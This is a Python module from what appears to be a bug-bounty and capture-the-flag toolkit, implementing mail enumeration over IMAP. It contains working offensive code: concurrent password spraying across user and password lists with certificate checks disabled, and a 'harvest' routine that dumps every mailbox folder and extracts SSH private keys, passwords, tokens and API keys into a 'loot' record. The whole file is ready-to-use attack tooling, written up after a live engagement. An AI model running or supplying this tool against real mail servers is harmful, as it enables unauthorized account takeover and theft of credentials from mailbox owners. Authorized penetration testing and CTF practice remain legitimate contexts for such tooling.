"""Mail enumeration — IMAP/POP3 login checks, concurrent spray, secret harvest.

Surfaced by a live engagement where the foothold was an onboarding credential
and the whole pivot lived in mailboxes — but the toolkit had no mail support, so
it was all hand-rolled (and serial spraying timed out). This module provides:

- ``try_login`` — a single IMAP credential check,
- ``spray`` — concurrent credential spraying (onboarding passwords are often
  shared defaults across users),
- ``harvest`` — dump a mailbox and extract SSH keys / credentials from bodies
  and attachments.

Connection creation is injectable (``client_factory``) so it is unit-testable
without a live server.

Usage:
    from bugbounty_ctf.mail_enum import MailEnumerator

    mail = MailEnumerator("10.10.10.10")
    valid = mail.spray(["kevin", "sarah", "it"], ["Welcome2024!"])
    for user, pw in valid:
        loot = mail.harvest(user, pw)
        print(loot["private_keys"], loot["credentials"])
"""

from __future__ import annotations

import contextlib
import email
import imaplib
import re
import ssl
from collections.abc import Callable, Sequence
from concurrent.futures import ThreadPoolExecutor
from typing import Any

DEFAULT_FOLDERS = ("INBOX", "Sent", "Drafts", "Trash", "Archive", "Junk")

_PRIVATE_KEY_RE = re.compile(
    r"-----BEGIN (?:OPENSSH|RSA|EC|DSA) PRIVATE KEY-----.*?-----END (?:OPENSSH|RSA|EC|DSA) "
    r"PRIVATE KEY-----",
    re.DOTALL,
)
_CRED_RE = re.compile(
    r"(?:password|passwd|pass|secret|token|api[_-]?key)\s*[:=]\s*(\S+)", re.IGNORECASE
)

ClientFactory = Callable[[], Any]


def extract_secrets(text: str) -> dict[str, list[str]]:
    """Pure helper: pull SSH private keys and credential-looking lines from text."""
    keys = _PRIVATE_KEY_RE.findall(text)
    creds = [m.group(0).strip() for m in _CRED_RE.finditer(text)]
    return {"private_keys": keys, "credentials": creds}


class MailEnumerator:
    """IMAP-based mail enumeration for a host."""

    def __init__(
        self,
        host: str,
        *,
        port: int = 993,
        use_ssl: bool = True,
        timeout: float = 8.0,
        client_factory: ClientFactory | None = None,
    ) -> None:
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.timeout = timeout
        self._client_factory = client_factory

    def _connect(self) -> Any:
        if self._client_factory is not None:
            return self._client_factory()
        client: imaplib.IMAP4
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            client = imaplib.IMAP4_SSL(self.host, self.port, ssl_context=ctx)
        else:
            client = imaplib.IMAP4(self.host, self.port)
        with contextlib.suppress(Exception):
            client.sock.settimeout(self.timeout)
        return client

    def try_login(self, user: str, password: str) -> bool:
        """Return True if (user, password) authenticates over IMAP."""
        try:
            client = self._connect()
            client.login(user, password)
            client.logout()
            return True
        except Exception:
            return False

    def spray(
        self,
        users: Sequence[str],
        passwords: Sequence[str],
        *,
        workers: int = 12,
        stop_on_first: bool = False,
    ) -> list[tuple[str, str]]:
        """Concurrently spray credentials. Returns the valid ``(user, password)`` pairs.

        Serial spraying over TLS times out on remote targets, so attempts run in
        a thread pool.
        """
        combos = [(u, p) for u in users for p in passwords]
        valid: list[tuple[str, str]] = []

        def attempt(combo: tuple[str, str]) -> tuple[str, str] | None:
            return combo if self.try_login(*combo) else None

        with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
            for result in pool.map(attempt, combos):
                if result:
                    valid.append(result)
                    if stop_on_first:
                        break
        return valid

    def harvest(
        self, user: str, password: str, folders: Sequence[str] = DEFAULT_FOLDERS
    ) -> dict[str, Any]:
        """Dump a mailbox and extract secrets (keys/creds) from bodies + attachments."""
        loot: dict[str, Any] = {
            "user": user,
            "messages": [],
            "private_keys": [],
            "credentials": [],
            "attachments": [],
        }
        try:
            client = self._connect()
            client.login(user, password)
        except Exception:
            return loot

        try:
            for box in folders:
                try:
                    typ, _ = client.select(box, readonly=True)
                except Exception:
                    continue
                if typ != "OK":
                    continue
                typ, data = client.search(None, "ALL")
                if typ != "OK" or not data or not data[0]:
                    continue
                for mid in data[0].split():
                    typ, md = client.fetch(mid, "(RFC822)")
                    if typ != "OK" or not md or not md[0]:
                        continue
                    self._ingest(email.message_from_bytes(md[0][1]), box, loot)
        finally:
            with contextlib.suppress(Exception):
                client.logout()
        return loot

    @staticmethod
    def _ingest(msg: Any, box: str, loot: dict[str, Any]) -> None:
        summary = {
            "folder": box,
            "from": msg.get("From", ""),
            "to": msg.get("To", ""),
            "subject": msg.get("Subject", ""),
        }
        loot["messages"].append(summary)
        parts = msg.walk() if msg.is_multipart() else [msg]
        for part in parts:
            fn = part.get_filename()
            if fn:
                loot["attachments"].append({"folder": box, "filename": fn})
            payload = part.get_payload(decode=True)
            if not payload:
                continue
            text = payload.decode("utf-8", errors="replace")
            found = extract_secrets(text)
            loot["private_keys"].extend(found["private_keys"])
            loot["credentials"].extend(found["credentials"])
